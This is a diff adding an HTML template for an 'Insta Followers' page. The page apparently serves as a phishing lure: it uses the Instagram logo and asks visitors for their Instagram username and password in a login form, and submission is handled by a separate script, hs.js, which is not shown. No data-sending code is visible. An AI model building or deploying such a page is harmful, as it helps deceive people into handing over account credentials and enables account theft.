@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insta Followers</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='hs.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h2>Insta Followers</h2>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo">
+        <h3>Please Enter Your IG Username & Password</h3>
+
+        <!-- Form Start -->
+        <form id="loginForm">
+            <!-- Username Input -->
+            <div class="input-group">
+                <input type="text" id="username" name="username" required placeholder=" ">
+                <label for="username">Enter the username</label>
+            </div>
+
+            <!-- Password Input with Toggle Eye -->
+            <div class="input-group password-container">
+                <input type="password" id="password" name="password" required placeholder=" ">
+                <label for="password">Enter the password</label>
+                <i class="fa fa-eye eye-icon" id="togglePassword"></i>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="btn" disabled>Continue</button>
+        </form>
+    </div>
+
+    <script src="{{ url_for('static', filename='hs.js') }}" defer></script>
+</body>
+</html>
